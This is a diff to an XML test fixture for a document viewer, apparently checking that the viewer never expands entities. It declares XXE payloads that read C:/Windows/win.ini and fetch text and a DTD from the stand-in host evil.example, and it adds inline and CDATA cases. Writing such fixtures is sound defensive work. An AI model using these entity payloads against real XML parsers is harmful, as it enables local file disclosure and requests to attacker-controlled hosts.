@@ -1,13 +1,16 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!-- Test file for the viewer: external entities (XXE) that would read a local file or fetch an address. The viewer
-     must never show win.ini's contents or fetch anything. -->
+<!-- Test file for the viewer: entities that would pull in text, read a local file or fetch an address (XXE). The
+     viewer never expands them: every reference is shown as written, win.ini is never read, nothing is fetched. -->
 <!DOCTYPE notes [
   <!ENTITY secret SYSTEM "file:///C:/Windows/win.ini">
   <!ENTITY remote SYSTEM "http://evil.example/entity.txt">
   <!ENTITY % dtd SYSTEM "http://evil.example/evil.dtd">
   %dtd;
+  <!ENTITY inner "EXPANDED-TEXT">
 ]>
 <notes>
   <note><title>Local file</title><body>&secret;</body></note>
   <note><title>Remote</title><body>&remote;</body></note>
+  <note kind="&inner;"><title>Inline</title><body>&inner; &lt;b&gt; &#x41;</body></note>
+  <note><title>CDATA</title><body><![CDATA[&inner; stays]]></body></note>
 </notes>
